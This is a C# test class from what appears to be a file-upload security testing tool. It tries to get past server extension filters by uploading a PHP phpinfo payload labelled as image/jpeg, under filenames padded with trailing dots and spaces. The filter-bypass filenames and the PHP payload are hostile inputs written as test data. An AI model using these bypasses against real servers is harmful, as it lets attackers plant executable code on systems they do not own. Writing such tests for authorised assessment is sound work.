using System.Text;
using System.Threading.Tasks;

/*
* Test #5
* Description: This test inserts a mixture of spaces and dots after the filename to avoid filters.
* The server will generally trim the extra spaces and dots.
*/
namespace FileUploadTool.Tests {
    class Test05 : Test {
        internal override async Task runTest(UploadRequest.UploadRequest request) {
            const string data = "<?php\n"
                              + "  echo phpinfo();\n"
                              + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");

            //Dot test
            request.setFileName("Test_5.php.");
            await request.send();
            printResult(request, "Test 5 (dot test)");

            //Space test
            request.setFileName("Test_5.php ");
            await request.send();
            printResult(request, "Test 5 (space test)");

            //Mixed test
            request.setFileName("Test_5.php… … . . .. .. ");
            await request.send();
            printResult(request, "Test 5 (mixed dot/space test)");
        }
    }
}
